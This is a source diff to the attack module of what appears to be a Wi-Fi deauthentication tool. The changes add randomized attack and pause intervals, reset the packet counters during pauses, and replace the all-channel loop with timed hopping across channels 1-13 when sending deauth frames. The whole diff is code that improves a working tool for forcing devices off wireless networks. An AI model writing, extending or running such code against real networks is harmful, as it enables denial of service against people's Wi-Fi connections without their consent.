@@ -23,9 +23,14 @@ void Attack::start() {
     prntln(A_START);
     attackTime      = currentTime;
     attackStartTime = currentTime;
+	resumeTime = 0;
+	changeChannelTime = 0;
 	if (settings.getAttackDuration())
 	{
 		pauseTime = currentTime + random(settings.getAttackDuration() * 1000, (long)(settings.getAttackDuration() * 1.5) * 1000);
+		prntln("Init Pause Time:");
+		prntln(pauseTime);
+		prntln(currentTime);
 	}
     accesspoints.sortAfterChannel();
     stations.sortAfterChannel();
@@ -73,6 +78,7 @@ void Attack::stop() {
 		pause = false;
 		pauseTime = 0;
 		resumeTime = 0;
+		changeChannelTime = 0;
         prntln(A_STOP);
     }
 }
@@ -89,7 +95,11 @@ void Attack::updateCounter() {
         return;
     }
 
-	tryPause();
+
+	if (tryPause())
+	{
+		return;
+	}
 
     // deauth packets per second
     if (deauth.active) {
@@ -152,22 +162,39 @@ void Attack::tryResume()
 
 
 
-void Attack::tryPause()
+bool Attack::tryPause()
 {
 	if (!settings.getAttackDuration())
 	{
-		return;
+		return false;
 	}
 	if (!pause && pauseTime && currentTime >= pauseTime)
 	{
 		pause = true;
 		pauseTime = 0;
 		resumeTime = currentTime + random(settings.getAttackInterval() * 1000, (long)(settings.getAttackInterval() * 1.5) * 1000);
+
+		deauthPkts = 0;
+		beaconPkts = 0;
+		probePkts = 0;
+		deauth.packetCounter = 0;
+		beacon.packetCounter = 0;
+		probe.packetCounter = 0;
+		deauth.maxPkts = 0;
+		beacon.maxPkts = 0;
+		probe.maxPkts = 0;
+		packetRate = 0;
+		deauth.tc = 0;
+		beacon.tc = 0;
+		probe.tc = 0;
+
 		prnt("parse attack :");
 		prnt(currentTime);
 		prnt(":");
 		prntln(resumeTime);
+		return true;
 	}
+	return false;
 }
 
 void Attack::status() {
@@ -177,6 +204,7 @@ void Attack::status() {
                 A_STATUS).c_str(), packetRate, deauthPkts, deauth.maxPkts, beaconPkts, beacon.maxPkts, probePkts,
             probe.maxPkts);
     prnt(String(s));
+	prntln(currentTime);
 }
 
 String Attack::getStatusJSON() {
@@ -248,6 +276,20 @@ void Attack::deauthUpdate() {
             // reset counter
             if (deauth.tc >= nCount + stCount + apCount) deauth.tc = 0;
         }
+		if (settings.getChannelTime())
+		{
+			if (currentTime - changeChannelTime > settings.getChannelTime())
+			{
+				++nch;
+				if (nch > 13)
+				{
+					nch = 1;
+				}
+				changeChannelTime = currentTime;
+        prnt("Change channel To: ");
+        prntln(nch);
+			}
+		}
     }
 }
 
@@ -328,12 +370,9 @@ bool Attack::deauthName(int num) {
 
 bool Attack::deauthDevices(uint8_t* apMac, uint8_t* stMac, uint8_t reason, uint8_t ch)
 {
-	if (settings.getIsAllChannel())
+	if (settings.getChannelTime())
 	{
-		for (uint8_t nch = 1; nch <= 13; ++nch)
-		{
-			deauthDevice(apMac, stMac, reason, nch);
-		}
+		deauthDevice(apMac, stMac, reason, nch);
 	}
 	else {
 		deauthDevice(apMac, stMac, reason, ch);
